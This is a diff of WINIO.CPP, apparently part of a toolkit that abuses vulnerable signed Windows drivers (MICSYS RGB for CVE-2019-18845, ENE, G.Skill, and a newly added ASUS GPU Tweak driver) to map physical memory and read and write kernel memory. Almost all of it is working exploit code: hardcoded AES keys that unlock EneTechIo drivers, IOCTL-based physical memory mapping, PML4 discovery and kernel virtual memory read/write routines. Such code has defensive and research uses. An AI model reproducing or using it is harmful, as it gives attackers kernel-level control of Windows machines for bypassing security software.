@@ -4,9 +4,9 @@
 *
 *  TITLE:       WINIO.CPP
 *
-*  VERSION:     1.10
+*  VERSION:     1.11
 *
-*  DATE:        15 Apr 2021
+*  DATE:        19 Apr 2021
 *
 *  WINIO based drivers routines.
 *
@@ -22,15 +22,18 @@
 
 #ifdef __cplusplus
 extern "C" {
-#include "tinyaes/aes.h"
+#include "../Shared/tinyaes/aes.h"
 }
 #endif
 
 //
 // AES keys used by EneTechIo latest variants.
 //
-ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
-ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };
+static ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
+static ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };
+
+ULONG g_WinIoMapIOCTL;
+ULONG g_WinIoUnmapIOCTL;
 
 //
 // Generic WINIO interface for all supported drivers based on WINIO code.
@@ -38,6 +41,7 @@ ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 
 // MICSYS RGB driver interface for CVE-2019-18845.
 // Ptolemy Tech Co., Ltd ENE driver interface
 // G.Skill EneIo64 driver interface
+// ASUS GPU Tweak driver interface
 // ... and multiple others
 //
 
@@ -83,7 +87,7 @@ PVOID MsIoMapMemory(
     request.ViewSize = PhysicalAddress + NumberOfBytes;
 
     if (supCallDriver(DeviceHandle,
-        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
+        g_WinIoMapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -120,7 +124,7 @@ VOID MsIoUnmapMemory(
     request.SectionHandle = SectionHandle;
 
     supCallDriver(DeviceHandle,
-        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
+        g_WinIoUnmapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -152,7 +156,7 @@ PVOID WinIoMapMemory(
     request.BusAddress = PhysicalAddress;
 
     if (supCallDriver(DeviceHandle,
-        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
+        g_WinIoMapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -189,7 +193,7 @@ VOID WinIoUnmapMemory(
     request.SectionHandle = SectionHandle;
 
     supCallDriver(DeviceHandle,
-        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
+        g_WinIoUnmapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -240,7 +244,7 @@ PVOID WinIoMapMemory2(
     AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);
 
     if (supCallDriver(DeviceHandle,
-        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
+        g_WinIoMapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -296,7 +300,7 @@ VOID WinIoUnmapMemory2(
     AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);
 
     supCallDriver(DeviceHandle,
-        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
+        g_WinIoUnmapIOCTL,
         &request,
         sizeof(request),
         &request,
@@ -315,7 +319,7 @@ BOOL WINAPI WinIoQueryPML4Value(
     _In_ HANDLE DeviceHandle,
     _Out_ ULONG_PTR* Value)
 {
-    DWORD dwError = ERROR_SUCCESS;
+    DWORD cbRead = 0x100000;
     ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
 
     PVOID refObject = NULL;
@@ -323,33 +327,26 @@ BOOL WINAPI WinIoQueryPML4Value(
 
     *Value = 0;
 
-    do {
+    SetLastError(ERROR_SUCCESS);
 
-        pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
-            0ULL,
-            0x100000,
-            &sectionHandle,
-            &refObject);
+    pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
+        0ULL,
+        cbRead,
+        &sectionHandle,
+        &refObject);
 
-        if (pbLowStub1M == 0) {
-            dwError = GetLastError();
-            break;
-        }
+    if (pbLowStub1M) {
 
         PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
         if (PML4)
             *Value = PML4;
-        else
-            *Value = 0;
 
         g_WinIoUnmapMemoryRoutine(DeviceHandle,
             (PVOID)pbLowStub1M,
             sectionHandle,
             refObject);
+    }
 
-    } while (FALSE);
-
-    SetLastError(dwError);
     return (PML4 != 0);
 }
 
@@ -511,7 +508,8 @@ BOOL WINAPI WinIoReadKernelVirtualMemory(
 {
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
-    DWORD dwError = ERROR_SUCCESS;
+
+    SetLastError(ERROR_SUCCESS);
 
     bResult = WinIoVirtualToPhysical(DeviceHandle,
         Address,
@@ -525,15 +523,8 @@ BOOL WINAPI WinIoReadKernelVirtualMemory(
             NumberOfBytes,
             FALSE);
 
-        if (!bResult)
-            dwError = GetLastError();
-
-    }
-    else {
-        dwError = GetLastError();
     }
 
-    SetLastError(dwError);
     return bResult;
 }
 
@@ -553,7 +544,8 @@ BOOL WINAPI WinIoWriteKernelVirtualMemory(
 {
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
-    DWORD dwError = ERROR_SUCCESS;
+
+    SetLastError(ERROR_SUCCESS);
 
     bResult = WinIoVirtualToPhysical(DeviceHandle,
         Address,
@@ -567,15 +559,8 @@ BOOL WINAPI WinIoWriteKernelVirtualMemory(
             NumberOfBytes,
             TRUE);
 
-        if (!bResult)
-            dwError = GetLastError();
-
-    }
-    else {
-        dwError = GetLastError();
     }
 
-    SetLastError(dwError);
     return bResult;
 }
 
@@ -645,6 +630,9 @@ BOOL WINAPI WinIoRegisterDriver(
 {
     ULONG DriverId = PtrToUlong(Param);
 
+    g_WinIoMapIOCTL = IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY;
+    g_WinIoUnmapIOCTL = IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY;
+
     switch (DriverId) {
     case IDR_GLCKIO2:
         g_WinIoMapMemoryRoutine = WinIoMapMemory;
@@ -674,6 +662,14 @@ BOOL WINAPI WinIoRegisterDriver(
         g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
         g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey2;
         g_PhysAddress64bit = TRUE;
+        break;
+
+    case IDR_ASUSIO2:
+        g_WinIoMapMemoryRoutine = WinIoMapMemory;
+        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
+        g_PhysAddress64bit = TRUE;
+        g_WinIoMapIOCTL = IOCTL_ASUSIO_MAP_USER_PHYSICAL_MEMORY;
+        g_WinIoUnmapIOCTL = IOCTL_ASUSIO_UNMAP_USER_PHYSICAL_MEMORY;
         break;
 
     default:
